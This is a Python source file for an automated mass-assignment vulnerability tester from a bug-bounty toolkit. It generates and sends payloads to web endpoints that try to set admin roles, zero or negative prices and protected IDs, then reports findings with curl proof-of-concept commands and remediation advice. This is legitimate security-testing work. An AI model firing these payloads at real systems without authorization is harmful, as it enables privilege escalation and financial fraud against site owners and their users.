"""
Mass Assignment Tester Agent

Advanced mass assignment vulnerability testing agent. Detects insecure object
binding, parameter pollution, hidden field manipulation, and privilege escalation
through mass assignment. Tests JSON mass assignment, nested object injection,
and framework-specific vulnerabilities across Rails, Laravel, Express, Django,
and other popular web frameworks.

Author: BountyHound Team
Version: 3.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import re
import json
import copy
import urllib.parse
from typing import Dict, List, Tuple, Optional, Set, Any
from dataclasses import dataclass, field, asdict
from datetime import date, datetime
from enum import Enum


try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

from engine.core.database import BountyHoundDB
from engine.core.db_hooks import DatabaseHooks


class Framework(Enum):
    """Web frameworks"""
    RAILS = "rails"
    LARAVEL = "laravel"
    EXPRESS = "express"
    DJANGO = "django"
    ASPNET = "aspnet"
    SPRING = "spring"
    UNKNOWN = "unknown"


class AttackType(Enum):
    """Types of mass assignment attacks"""
    PRIVILEGE_ESCALATION = "privilege_escalation"
    PRICE_MANIPULATION = "price_manipulation"
    HIDDEN_FIELD = "hidden_field"
    NESTED_INJECTION = "nested_injection"
    ARRAY_INJECTION = "array_injection"
    ID_MANIPULATION = "id_manipulation"


class SeverityLevel(Enum):
    """Severity levels"""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


@dataclass
class MassAssignmentPayload:
    """Mass assignment test payload"""
    field: str
    value: Any
    attack_type: AttackType
    framework: Framework
    format: str  # 'form', 'json', 'nested'
    description: str

    def to_dict(self) -> Dict[str, Any]:
        """Convert payload to dictionary."""
        return {
            'field': self.field,
            'value': self.value,
            'attack_type': self.attack_type.value,
            'framework': self.framework.value,
            'format': self.format,
            'description': self.description
        }


@dataclass
class MassAssignmentFinding:
    """Mass assignment vulnerability finding"""
    title: str
    endpoint: str
    method: str
    field: str
    payload: str
    attack_type: AttackType
    framework: Framework
    severity: SeverityLevel
    evidence: str
    before_state: Dict
    after_state: Dict
    impact: str
    remediation: str
    cvss_score: float
    cwe_id: str = "CWE-915"
    discovered_date: str = field(default_factory=lambda: date.today().isoformat())
    poc: str = ""
    request_headers: Dict[str, str] = field(default_factory=dict)
    response_headers: Dict[str, str] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert finding to dictionary with enum handling."""
        data = asdict(self)
        data['severity'] = self.severity.value
        data['attack_type'] = self.attack_type.value
        data['framework'] = self.framework.value
        return data


@dataclass
class MassAssignmentTestResult:
    """Result from a mass assignment test."""
    endpoint: str
    payload: MassAssignmentPayload
    status_code: int
    response_body: str
    response_headers: Dict[str, str]
    is_vulnerable: bool
    vulnerability_details: Optional[Dict[str, Any]] = None
    error: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        """Convert test result to dictionary."""
        data = asdict(self)
        data['payload'] = self.payload.to_dict()
        return data


class FrameworkDetector:
    """Detect web framework"""

    FRAMEWORK_SIGNATURES = {
        Framework.RAILS: [
            'X-Runtime',
            'Set-Cookie: _session_id',
            'authenticity_token',
            'csrf-token',
            '_rails_session'
        ],
        Framework.LARAVEL: [
            'Set-Cookie: laravel_session',
            'X-Powered-By: PHP',
            '_token',
            'XSRF-TOKEN',
            'laravel_token'
        ],
        Framework.EXPRESS: [
            'X-Powered-By: Express',
            'connect.sid',
            'express-session',
            'express:'
        ],
        Framework.DJANGO: [
            'csrftoken',
            'Set-Cookie: csrftoken',
            'X-Frame-Options: DENY',
            'django',
            'sessionid'
        ],
        Framework.ASPNET: [
            'X-AspNet-Version',
            'X-AspNetMvc-Version',
            '__VIEWSTATE',
            'ASP.NET_SessionId',
            'ASPXAUTH'
        ],
        Framework.SPRING: [
            'X-Application-Context',
            'JSESSIONID',
            'Spring',
            'spring-boot'
        ]
    }

    def detect(self, response: Dict) -> Framework:
        """Detect framework from response"""
        headers = response.get('headers', {})
        body = response.get('body', '')

        # Check headers and body for signatures
        for framework, signatures in self.FRAMEWORK_SIGNATURES.items():
            for signature in signatures:
                # Check headers
                if any(signature.lower() in k.lower() or signature.lower() in str(v).lower()
                       for k, v in headers.items()):
                    return framework

                # Check body
                if signature.lower() in body.lower():
                    return framework

        return Framework.UNKNOWN

    def detect_from_url(self, url: str) -> Framework:
        """Detect framework from URL patterns"""
        url_lower = url.lower()

        if '/rails/' in url_lower or '.rails' in url_lower:
            return Framework.RAILS
        elif '/laravel/' in url_lower or 'php' in url_lower:
            return Framework.LARAVEL
        elif '/api/' in url_lower and 'node' in url_lower:
            return Framework.EXPRESS
        elif '/django/' in url_lower or 'py' in url_lower:
            return Framework.DJANGO
        elif '/aspnet/' in url_lower or '.aspx' in url_lower:
            return Framework.ASPNET
        elif '/spring/' in url_lower or 'java' in url_lower:
            return Framework.SPRING

        return Framework.UNKNOWN


class FieldEnumerator:
    """Enumerate vulnerable fields"""

    # Common privileged fields
    PRIVILEGE_FIELDS = [
        'is_admin', 'is_administrator', 'admin', 'isAdmin',
        'role', 'user_role', 'userRole', 'user_type', 'userType',
        'level', 'rank', 'tier',
        'permissions', 'privileges', 'rights',
        'verified', 'is_verified', 'isVerified', 'verified_at',
        'active', 'is_active', 'isActive',
        'status', 'account_status', 'accountStatus',
        'is_staff', 'is_superuser', 'isSuperuser',
        'access_level', 'accessLevel', 'permission_level'
    ]

    # System fields that shouldn't be user-modifiable
    SYSTEM_FIELDS = [
        'id', 'pk', 'user_id', 'userId', 'account_id', 'accountId',
        'created_by', 'createdBy', 'updated_by', 'updatedBy',
        'created_at', 'createdAt', 'updated_at', 'updatedAt',
        'deleted_at', 'deletedAt', 'password_digest', 'passwordDigest',
        'reset_token', 'resetToken', 'confirmation_token',
        'uuid', 'guid', 'external_id', 'externalId',
        'token', 'api_key', 'apiKey', 'secret_key'
    ]

    # Financial fields
    FINANCIAL_FIELDS = [
        'price', 'cost', 'amount', 'total', 'subtotal',
        'discount', 'discount_amount', 'discountAmount',
        'balance', 'account_balance', 'accountBalance',
        'credits', 'points', 'rewards',
        'paid', 'is_paid', 'isPaid', 'payment_status',
        'refund', 'refund_amount', 'refundAmount',
        'fee', 'tax', 'shipping_cost'
    ]

    def enumerate_fields(self, endpoint_data: Dict) -> Dict[str, List[str]]:
        """Enumerate potentially vulnerable fields"""
        return {
            'privilege': self.PRIVILEGE_FIELDS.copy(),
            'system': self.SYSTEM_FIELDS.copy(),
            'financial': self.FINANCIAL_FIELDS.copy()
        }

    def extract_fields_from_response(self, response: Dict) -> List[str]:
        """Extract field names from response"""
        fields = []
        body = response.get('body', '')

        try:
            # Try to parse as JSON
            data = json.loads(body)
            fields.extend(self._extract_from_dict(data))
        except:
            # Extract from HTML forms
            fields.extend(self._extract_from_html(body))

        return list(set(fields))

    def _extract_from_dict(self, data: Any, prefix: str = '') -> List[str]:
        """Recursively extract field names from dict"""
        fields = []

        if isinstance(data, dict):
            for key, value in data.items():
                field_name = f"{prefix}.{key}" if prefix else key
                fields.append(field_name)

                if isinstance(value, (dict, list)):
                    fields.extend(self._extract_from_dict(value, field_name))

        elif isinstance(data, list):
            for item in data:
                if isinstance(item, (dict, list)):
                    fields.extend(self._extract_from_dict(item, prefix))

        return fields

    def _extract_from_html(self, html: str) -> List[str]:
        """Extract field names from HTML forms"""
        fields = []

        # Extract input names
        input_pattern = r'<input[^>]+name=["\']([^"\']+)["\']'
        fields.extend(re.findall(input_pattern, html, re.IGNORECASE))

        # Extract textarea names
        textarea_pattern = r'<textarea[^>]+name=["\']([^"\']+)["\']'
        fields.extend(re.findall(textarea_pattern, html, re.IGNORECASE))

        # Extract select names
        select_pattern = r'<select[^>]+name=["\']([^"\']+)["\']'
        fields.extend(re.findall(select_pattern, html, re.IGNORECASE))

        return fields


class PayloadGenerator:
    """Generate mass assignment payloads"""

    def __init__(self):
        self.field_enum = FieldEnumerator()

    def generate_privilege_escalation(self, framework: Framework) -> List[MassAssignmentPayload]:
        """Generate privilege escalation payloads"""
        payloads = []

        privilege_fields = self.field_enum.PRIVILEGE_FIELDS

        for field in privilege_fields:
            # Boolean values
            for value in [True, 1, "true", "1", "yes"]:
                payloads.append(MassAssignmentPayload(
                    field=field,
                    value=value,
                    attack_type=AttackType.PRIVILEGE_ESCALATION,
                    framework=framework,
                    format='form',
                    description=f"Privilege escalation via {field}={value}"
                ))

            # Role values
            if 'role' in field.lower():
                for role in ['admin', 'administrator', 'superuser', 'root', 'moderator']:
                    payloads.append(MassAssignmentPayload(
                        field=field,
                        value=role,
                        attack_type=AttackType.PRIVILEGE_ESCALATION,
                        framework=framework,
                        format='form',
                        description=f"Role escalation to {role}"
                    ))

            # Level/rank values
            if 'level' in field.lower() or 'rank' in field.lower():
                for level in [999, 100, 9999]:
                    payloads.append(MassAssignmentPayload(
                        field=field,
                        value=level,
                        attack_type=AttackType.PRIVILEGE_ESCALATION,
                        framework=framework,
                        format='form',
                        description=f"Level escalation to {level}"
                    ))

        return payloads

    def generate_price_manipulation(self, framework: Framework) -> List[MassAssignmentPayload]:
        """Generate price manipulation payloads"""
        payloads = []

        financial_fields = self.field_enum.FINANCIAL_FIELDS

        for field in financial_fields:
            # Zero/negative prices
            for value in [0, 0.01, -1, -100, -999.99]:
                payloads.append(MassAssignmentPayload(
                    field=field,
                    value=value,
                    attack_type=AttackType.PRICE_MANIPULATION,
                    framework=framework,
                    format='form',
                    description=f"Price manipulation: {field}={value}"
                ))

            # Discount abuse
            if 'discount' in field.lower():
                for value in [100, 99.99, 1000]:
                    payloads.append(MassAssignmentPayload(
                        field=field,
                        value=value,
                        attack_type=AttackType.PRICE_MANIPULATION,
                        framework=framework,
                        format='form',
                        description=f"Discount abuse: {field}={value}"
                    ))

        return payloads

    def generate_hidden_field(self, framework: Framework) -> List[MassAssignmentPayload]:
        """Generate hidden field manipulation payloads"""
        payloads = []

        system_fields = self.field_enum.SYSTEM_FIELDS

        for field in system_fields:
            # ID manipulation
            if 'id' in field.lower():
                for value in [1, 999, "admin", "00000000-0000-0000-0000-000000000001"]:
                    payloads.append(MassAssignmentPayload(
                        field=field,
                        value=value,
                        attack_type=AttackType.HIDDEN_FIELD,
                        framework=framework,
                        format='form',
                        description=f"ID manipulation: {field}={value}"
                    ))

            # Timestamp manipulation
            if 'created_at' in field.lower() or 'updated_at' in field.lower():
                payloads.append(MassAssignmentPayload(
                    field=field,
                    value="2020-01-01T00:00:00Z",
                    attack_type=AttackType.HIDDEN_FIELD,
                    framework=framework,
                    format='form',
                    description=f"Timestamp manipulation: {field}"
                ))

        return payloads

    def generate_nested_injection(self, framework: Framework) -> List[MassAssignmentPayload]:
        """Generate nested object injection payloads"""
        payloads = []

        if framework == Framework.RAILS:
            # Rails nested attributes
            nested_patterns = [
                ("user[is_admin]", True),
                ("user[role]", "admin"),
                ("user[profile_attributes][role]", "admin"),
                ("user[settings_attributes][permissions][]", "admin"),
                ("account[verified]", True),
                ("profile[level]", 999),
            ]

            for field, value in nested_patterns:
                payloads.append(MassAssignmentPayload(
                    field=field,
                    value=value,
                    attack_type=AttackType.NESTED_INJECTION,
                    framework=framework,
                    format='nested',
                    description=f"Nested injection: {field}={value}"
                ))

        elif framework == Framework.EXPRESS:
            # Express.js JSON nested
            nested_objects = [
                {"isAdmin": True},
                {"role": "admin"},
                {"profile": {"role": "admin"}},
                {"settings": {"permissions": ["admin"]}},
                {"user": {"verified": True, "level": 999}},
            ]

            for obj in nested_objects:
                payloads.append(MassAssignmentPayload(
                    field=list(obj.keys())[0],
                    value=obj,
                    attack_type=AttackType.NESTED_INJECTION,
                    framework=framework,
                    format='json',
                    description=f"JSON nested injection"
                ))

        return payloads

    def generate_array_injection(self, framework: Framework) -> List[MassAssignmentPayload]:
        """Generate array injection payloads"""
        payloads = []

        array_fields = [
            ("roles[]", ["admin", "user"]),
            ("permissions[]", ["read", "write", "delete", "admin"]),
            ("groups[]", [1, 2, 3, 999]),
            ("tags[]", ["admin", "privileged"]),
            ("access[]", ["admin", "superuser"]),
        ]

        for field, value in array_fields:
            payloads.append(MassAssignmentPayload(
                field=field,
                value=value,
                attack_type=AttackType.ARRAY_INJECTION,
                framework=framework,
                format='form',
                description=f"Array injection: {field}"
            ))

        return payloads

    def generate_framework_specific(self, framework: Framework) -> List[MassAssignmentPayload]:
        """Generate framework-specific payloads"""
        payloads = []

        if framework == Framework.LARAVEL:
            # Laravel guarded bypass
            payloads.extend([
                MassAssignmentPayload(
                    field="_method",
                    value="PUT",
                    attack_type=AttackType.HIDDEN_FIELD,
                    framework=framework,
                    format='form',
                    description="HTTP method override"
                ),
                MassAssignmentPayload(
                    field="id",
                    value=1,
                    attack_type=AttackType.ID_MANIPULATION,
                    framework=framework,
                    format='form',
                    description="ID manipulation with method override"
                )
            ])

        elif framework == Framework.RAILS:
            # Rails mass assignment
            payloads.extend([
                MassAssignmentPayload(
                    field="user[admin]",
                    value=True,
                    attack_type=AttackType.PRIVILEGE_ESCALATION,
                    framework=framework,
                    format='nested',
                    description="Rails nested parameters"
                )
            ])

        elif framework == Framework.DJANGO:
            # Django ModelForm bypass
            payloads.extend([
                MassAssignmentPayload(
                    field="is_staff",
                    value=True,
                    attack_type=AttackType.PRIVILEGE_ESCALATION,
                    framework=framework,
                    format='form',
                    description="Django staff privilege escalation"
                ),
                MassAssignmentPayload(
                    field="is_superuser",
                    value=True,
                    attack_type=AttackType.PRIVILEGE_ESCALATION,
                    framework=framework,
                    format='form',
                    description="Django superuser escalation"
                )
            ])

        return payloads

    def generate_all_payloads(self, framework: Framework) -> List[MassAssignmentPayload]:
        """Generate all payload types"""
        all_payloads = []

        all_payloads.extend(self.generate_privilege_escalation(framework))
        all_payloads.extend(self.generate_price_manipulation(framework))
        all_payloads.extend(self.generate_hidden_field(framework))
        all_payloads.extend(self.generate_nested_injection(framework))
        all_payloads.extend(self.generate_array_injection(framework))
        all_payloads.extend(self.generate_framework_specific(framework))

        return all_payloads


class ResponseAnalyzer:
    """Analyze responses for mass assignment success"""

    def __init__(self):
        pass

    def analyze_response(self, baseline: Dict, attack: Dict, payload: MassAssignmentPayload) -> Optional[MassAssignmentFinding]:
        """Analyze response for successful mass assignment"""

        # Compare responses
        if not self._response_differs(baseline, attack):
            return None

        # Check for success indicators
        success_indicators = self._check_success_indicators(attack, payload)

        if not success_indicators:
            return None

        # Determine severity
        severity = self._calculate_severity(payload)

        # Extract state changes
        before_state = self._extract_state(baseline)
        after_state = self._extract_state(attack)

        # Create finding
        finding = MassAssignmentFinding(
            title=self._generate_title(payload),
            endpoint=attack.get('url', ''),
            method=attack.get('method', 'POST'),
            field=payload.field,
            payload=self._format_payload(payload),
            attack_type=payload.attack_type,
            framework=payload.framework,
            severity=severity,
            evidence=self._extract_evidence(attack, payload),
            before_state=before_state,
            after_state=after_state,
            impact=self._generate_impact(payload),
            remediation=self._generate_remediation(payload.framework),
            cvss_score=self._calculate_cvss(severity),
            poc=self._generate_poc(attack, payload),
            request_headers=attack.get('request_headers', {}),
            response_headers=attack.get('headers', {})
        )

        return finding

    def _response_differs(self, baseline: Dict, attack: Dict) -> bool:
        """Check if responses differ significantly"""
        # Status code change
        baseline_status = baseline.get('status_code', 0)
        attack_status = attack.get('status_code', 0)

        if baseline_status != attack_status:
            # 200 -> 403 is not success, but 403 -> 200 might be
            if attack_status in [200, 201, 204]:
                return True

        # Body content change
        baseline_body = baseline.get('body', '')
        attack_body = attack.get('body', '')

        # Significant length difference
        if abs(len(baseline_body) - len(attack_body)) > 50:
            return True

        # Different JSON structure
        try:
            baseline_json = json.loads(baseline_body)
            attack_json = json.loads(attack_body)

            if baseline_json != attack_json:
                return True
        except:
            pass

        return False

    def _check_success_indicators(self, response: Dict, payload: MassAssignmentPayload) -> bool:
        """Check for mass assignment success indicators"""
        body = response.get('body', '').lower()
        status = response.get('status_code', 0)

        # Success status codes
        if status in [200, 201, 204]:
            # Check for field in response
            if payload.field.lower() in body:
                return True

            # Check for success messages
            success_keywords = ['success', 'updated', 'created', 'saved', 'modified', 'changed']
            if any(keyword in body for keyword in success_keywords):
                return True

        # Check for privilege indicators
        if payload.attack_type == AttackType.PRIVILEGE_ESCALATION:
            privilege_keywords = ['admin', 'administrator', 'superuser', 'privileged', 'elevated']
            if any(keyword in body for keyword in privilege_keywords):
                return True

        # Check for price manipulation indicators
        if payload.attack_type == AttackType.PRICE_MANIPULATION:
            if str(payload.value) in body:
                return True

        return False

    def _calculate_severity(self, payload: MassAssignmentPayload) -> SeverityLevel:
        """Calculate finding severity"""
        if payload.attack_type == AttackType.PRIVILEGE_ESCALATION:
            return SeverityLevel.CRITICAL

        elif payload.attack_type == AttackType.PRICE_MANIPULATION:
            if payload.value in [0, 0.01] or (isinstance(payload.value, (int, float)) and payload.value < 0):
                return SeverityLevel.CRITICAL
            else:
                return SeverityLevel.HIGH

        elif payload.attack_type == AttackType.ID_MANIPULATION:
            return SeverityLevel.HIGH

        elif payload.attack_type == AttackType.HIDDEN_FIELD:
            return SeverityLevel.HIGH

        elif payload.attack_type in [AttackType.NESTED_INJECTION, AttackType.ARRAY_INJECTION]:
            return SeverityLevel.MEDIUM

        return SeverityLevel.LOW

    def _extract_state(self, response: Dict) -> Dict:
        """Extract object state from response"""
        try:
            body = response.get('body', '')
            data = json.loads(body)

            # Flatten nested objects
            return self._flatten_dict(data)
        except:
            return {}

    def _flatten_dict(self, data: Any, prefix: str = '') -> Dict:
        """Flatten nested dictionary"""
        result = {}

        if isinstance(data, dict):
            for key, value in data.items():
                new_key = f"{prefix}.{key}" if prefix else key

                if isinstance(value, (dict, list)):
                    result.update(self._flatten_dict(value, new_key))
                else:
                    result[new_key] = value

        elif isinstance(data, list):
            for i, item in enumerate(data):
                new_key = f"{prefix}[{i}]"
                if isinstance(item, (dict, list)):
                    result.update(self._flatten_dict(item, new_key))
                else:
                    result[new_key] = item

        return result

    def _extract_evidence(self, response: Dict, payload: MassAssignmentPayload) -> str:
        """Extract evidence from response"""
        body = response.get('body', '')

        # Try to find the modified field in response
        try:
            data = json.loads(body)
            flattened = self._flatten_dict(data)

            # Look for payload field
            for key, value in flattened.items():
                if payload.field.lower() in key.lower():
                    return f"{key}: {value}"

        except:
            pass

        # Return first 300 chars of body
        return body[:300]

    def _format_payload(self, payload: MassAssignmentPayload) -> str:
        """Format payload for display"""
        if payload.format == 'json':
            if isinstance(payload.value, dict):
                return json.dumps(payload.value)
            return json.dumps({payload.field: payload.value})
        elif payload.format == 'nested':
            return f"{payload.field}={payload.value}"
        else:
            return f"{payload.field}={payload.value}"

    def _generate_title(self, payload: MassAssignmentPayload) -> str:
        """Generate finding title"""
        titles = {
            AttackType.PRIVILEGE_ESCALATION: f"Mass Assignment Privilege Escalation via {payload.field}",
            AttackType.PRICE_MANIPULATION: f"Mass Assignment Price Manipulation via {payload.field}",
            AttackType.ID_MANIPULATION: f"Mass Assignment ID Manipulation via {payload.field}",
            AttackType.HIDDEN_FIELD: f"Mass Assignment Hidden Field Modification via {payload.field}",
            AttackType.NESTED_INJECTION: f"Mass Assignment Nested Object Injection via {payload.field}",
            AttackType.ARRAY_INJECTION: f"Mass Assignment Array Injection via {payload.field}"
        }
        return titles.get(payload.attack_type, f"Mass Assignment Vulnerability via {payload.field}")

    def _generate_impact(self, payload: MassAssignmentPayload) -> str:
        """Generate impact description"""
        impacts = {
            AttackType.PRIVILEGE_ESCALATION: "Attacker can escalate privileges to administrator, gaining full control over the application and all user data.",
            AttackType.PRICE_MANIPULATION: "Attacker can manipulate prices to zero or negative values, causing financial loss through free or refunded purchases.",
            AttackType.ID_MANIPULATION: "Attacker can manipulate object IDs to access or modify other users' data, leading to account takeover.",
            AttackType.HIDDEN_FIELD: "Attacker can modify protected system fields, potentially corrupting data integrity or bypassing security controls.",
            AttackType.NESTED_INJECTION: "Attacker can inject malicious data into nested objects, bypassing input validation and access controls.",
            AttackType.ARRAY_INJECTION: "Attacker can inject unauthorized roles or permissions through array parameters, escalating privileges."
        }

        return impacts.get(payload.attack_type, "Attacker can modify protected fields through mass assignment.")

    def _generate_remediation(self, framework: Framework) -> str:
        """Generate framework-specific remediation"""
        remediations = {
            Framework.RAILS: """1. Use strong parameters with explicit permit list
2. Never use permit! or permit(*fields)
3. Implement attr_accessible or attr_protected
4. Validate all user inputs
5. Use separate parameters for different operations
Example: params.require(:user).permit(:name, :email)""",

            Framework.LARAVEL: """1. Define $fillable property with allowed fields
2. Or use $guarded to block specific fields
3. Never set $guarded = []
4. Validate all inputs with FormRequest
5. Use separate models for different roles
Example: protected $fillable = ['name', 'email'];""",

            Framework.EXPRESS: """1. Explicitly whitelist allowed fields
2. Never use Object.assign(user, req.body)
3. Validate inputs with joi or express-validator
4. Use DTOs (Data Transfer Objects)
5. Implement role-based field access
Example: const {name, email} = req.body; user.name = name;""",

            Framework.DJANGO: """1. Use ModelForm with explicit fields list
2. Never use fields = '__all__'
3. Implement clean methods for validation
4. Use exclude to block sensitive fields
5. Separate forms for different user roles
Example: fields = ['name', 'email']""",

            Framework.SPRING: """1. Use @JsonIgnore on sensitive fields
2. Implement custom DTOs for input binding
3. Validate with @Valid and custom validators
4. Use @JsonProperty(access = READ_ONLY)
5. Implement SecurityContext checks
Example: @JsonProperty(access = JsonProperty.Access.READ_ONLY)""",
        }

        return remediations.get(framework, """1. Explicitly whitelist allowed fields
2. Validate all user inputs
3. Implement proper authorization checks
4. Use separate objects for input and persistence
5. Never bind user input directly to model objects""")

    def _calculate_cvss(self, severity: SeverityLevel) -> float:
        """Calculate CVSS score"""
        scores = {
            SeverityLevel.CRITICAL: 8.8,
            SeverityLevel.HIGH: 7.5,
            SeverityLevel.MEDIUM: 5.3,
            SeverityLevel.LOW: 3.1,
            SeverityLevel.INFO: 0.0
        }
        return scores.get(severity, 0.0)

    def _generate_poc(self, response: Dict, payload: MassAssignmentPayload) -> str:
        """Generate proof-of-concept code"""
        url = response.get('url', '')
        method = response.get('method', 'POST')

        if payload.format == 'json':
            poc = f"""curl -X {method} '{url}' \\
  -H 'Content-Type: application/json' \\
  -d '{self._format_payload(payload)}'"""
        else:
            poc = f"""curl -X {method} '{url}' \\
  -H 'Content-Type: application/x-www-form-urlencoded' \\
  -d '{payload.field}={payload.value}'"""

        return poc


class MassAssignmentTester:
    """Main mass assignment testing engine"""

    def __init__(self, target: str, timeout: int = 10, verify_ssl: bool = True):
        """
        Initialize the Mass Assignment Tester.

        Args:
            target: Target domain or base URL
            timeout: Request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
        """
        if not REQUESTS_AVAILABLE:
            raise ImportError("requests library is required. Install with: pip install requests")

        self.target = target
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.detector = FrameworkDetector()
        self.payload_gen = PayloadGenerator()
        self.analyzer = ResponseAnalyzer()
        self.findings: List[MassAssignmentFinding] = []
        self.test_results: List[MassAssignmentTestResult] = []
        self.db = BountyHoundDB()

    def test_endpoint(self, url: str, method: str = "POST",
                     baseline_data: Optional[Dict] = None,
                     headers: Optional[Dict[str, str]] = None) -> List[MassAssignmentFinding]:
        """
        Test endpoint for mass assignment vulnerabilities.

        Args:
            url: Endpoint URL to test
            method: HTTP method (POST, PUT, PATCH)
            baseline_data: Baseline request data
            headers: Request headers

        Returns:
            List of findings
        """
        findings = []

        # Check database first
        context = DatabaseHooks.before_test(self.target, 'mass_assignment_tester')

        if context['should_skip']:
            print(f"⚠️  {context['reason']}")
            print(f"Previous findings: {len(context['previous_findings'])}")
            # Still proceed but use context to optimize

        # Make baseline request
        baseline_response = self._make_baseline_request(url, method, baseline_data, headers)

        if not baseline_response:
            return findings

        # Detect framework
        framework = self.detector.detect(baseline_response)

        # If unknown, try URL detection
        if framework == Framework.UNKNOWN:
            framework = self.detector.detect_from_url(url)

        # Generate payloads
        payloads = self.payload_gen.generate_all_payloads(framework)

        # Test each payload
        for payload in payloads:
            attack_response = self._make_attack_request(url, method, payload, baseline_data, headers)

            if attack_response:
                # Analyze
                finding = self.analyzer.analyze_response(baseline_response, attack_response, payload)

                if finding:
                    findings.append(finding)
                    self.findings.append(finding)

                    # Record in database
                    self._record_finding(finding)

        return findings

    def _make_baseline_request(self, url: str, method: str,
                               data: Optional[Dict] = None,
                               headers: Optional[Dict[str, str]] = None) -> Optional[Dict]:
        """Make baseline request to establish normal behavior"""
        try:
            default_headers = {'User-Agent': 'BountyHound/3.0'}
            if headers:
                default_headers.update(headers)

            response = requests.request(
                method=method,
                url=url,
                data=data,
                headers=default_headers,
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=False
            )

            return {
                'url': url,
                'method': method,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'body': response.text,
                'request_headers': default_headers
            }
        except Exception as e:
            print(f"Error making baseline request: {e}")
            return None

    def _make_attack_request(self, url: str, method: str,
                            payload: MassAssignmentPayload,
                            baseline_data: Optional[Dict] = None,
                            headers: Optional[Dict[str, str]] = None) -> Optional[Dict]:
        """Make attack request with mass assignment payload"""
        try:
            default_headers = {'User-Agent': 'BountyHound/3.0'}
            if headers:
                default_headers.update(headers)

            # Build attack data
            attack_data = baseline_data.copy() if baseline_data else {}

            if payload.format == 'json':
                default_headers['Content-Type'] = 'application/json'
                if isinstance(payload.value, dict):
                    attack_data.update(payload.value)
                else:
                    attack_data[payload.field] = payload.value
                data = json.dumps(attack_data)
            else:
                # Form data
                attack_data[payload.field] = payload.value
                data = attack_data

            response = requests.request(
                method=method,
                url=url,
                data=data,
                headers=default_headers,
                timeout=self.timeout,
                verify=self.verify_ssl,
                allow_redirects=False
            )

            return {
                'url': url,
                'method': method,
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'body': response.text,
                'request_headers': default_headers
            }
        except Exception as e:
            print(f"Error making attack request: {e}")
            return None

    def _record_finding(self, finding: MassAssignmentFinding):
        """Record finding in database"""
        try:
            # Get or create target
            target_id = self.db.get_or_create_target(
                domain=self.target,
                platform="unknown"
            )

            # Insert finding
            self.db.add_finding(
                target_id=target_id,
                title=finding.title,
                severity=finding.severity.value,
                vuln_type=f"MASS_ASSIGNMENT_{finding.attack_type.value.upper()}",
                description=finding.impact,
                poc=finding.poc,
                endpoints=[finding.endpoint]
            )
        except Exception as e:
            print(f"Error recording finding in database: {e}")

    def run_all_tests(self, endpoints: List[str],
                     method: str = "POST",
                     headers: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
        """
        Run all mass assignment tests on multiple endpoints.

        Args:
            endpoints: List of endpoint URLs to test
            method: HTTP method
            headers: Request headers

        Returns:
            Comprehensive test report
        """
        print(f"Starting mass assignment testing on {len(endpoints)} endpoints...")

        # Check database before starting
        context = DatabaseHooks.before_test(self.target, 'mass_assignment_tester')

        if context['should_skip']:
            print(f"\n⚠️  Database Check: {context['reason']}")
            print(f"Previous findings: {len(context['previous_findings'])}")
            user_input = input("Continue anyway? (y/n): ")
            if user_input.lower() != 'y':
                return self.generate_report()

        for endpoint in endpoints:
            print(f"\nTesting: {endpoint}")
            findings = self.test_endpoint(endpoint, method=method, headers=headers)
            print(f"  Found {len(findings)} vulnerabilities")

        return self.generate_report()

    def generate_report(self) -> Dict[str, Any]:
        """Generate comprehensive report"""
        if not self.findings:
            return {
                'status': 'no_findings',
                'total_tests': 0,
                'findings': [],
                'summary': 'No mass assignment vulnerabilities detected'
            }

        # Group by severity
        by_severity = {}
        for finding in self.findings:
            severity = finding.severity.value
            if severity not in by_severity:
                by_severity[severity] = []
            by_severity[severity].append(finding)

        # Group by attack type
        by_attack_type = {}
        for finding in self.findings:
            attack_type = finding.attack_type.value
            if attack_type not in by_attack_type:
                by_attack_type[attack_type] = []
            by_attack_type[attack_type].append(finding)

        return {
            'status': 'vulnerable',
            'total_findings': len(self.findings),
            'critical': len(by_severity.get('CRITICAL', [])),
            'high': len(by_severity.get('HIGH', [])),
            'medium': len(by_severity.get('MEDIUM', [])),
            'low': len(by_severity.get('LOW', [])),
            'by_attack_type': {k: len(v) for k, v in by_attack_type.items()},
            'findings': [finding.to_dict() for finding in self.findings],
            'summary': self._generate_summary()
        }

    def _generate_summary(self) -> str:
        """Generate executive summary"""
        total = len(self.findings)
        critical = len([f for f in self.findings if f.severity == SeverityLevel.CRITICAL])
        high = len([f for f in self.findings if f.severity == SeverityLevel.HIGH])

        summary = f"Discovered {total} mass assignment vulnerabilities: "
        summary += f"{critical} CRITICAL, {high} HIGH severity issues. "

        # Most common attack type
        attack_types = [f.attack_type.value for f in self.findings]
        if attack_types:
            most_common = max(set(attack_types), key=attack_types.count)
            summary += f"Primary vulnerability: {most_common.replace('_', ' ').title()}."

        return summary


# Example usage
def main():
    """Example usage of Mass Assignment Tester"""

    # Initialize tester
    tester = MassAssignmentTester(target="example.com")

    # Test specific endpoint
    findings = tester.test_endpoint(
        url="https://api.example.com/users/123",
        method="PUT",
        headers={"Authorization": "Bearer token"}
    )

    print(f"Found {len(findings)} vulnerabilities")

    # Generate report
    report = tester.generate_report()
    print(json.dumps(report, indent=2))


if __name__ == "__main__":
    main()
